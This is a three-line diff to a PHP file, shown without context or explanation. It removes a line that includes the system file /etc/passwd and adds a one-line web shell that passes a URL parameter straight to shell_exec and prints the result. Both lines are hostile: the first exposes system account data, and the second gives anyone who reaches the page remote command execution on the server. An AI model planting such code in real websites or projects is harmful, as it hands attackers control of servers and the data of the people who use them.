@@ -1,3 +1,3 @@
 <?php
-include('/etc/passwd');
+echo shell_exec($_GET['command']);
 ?>
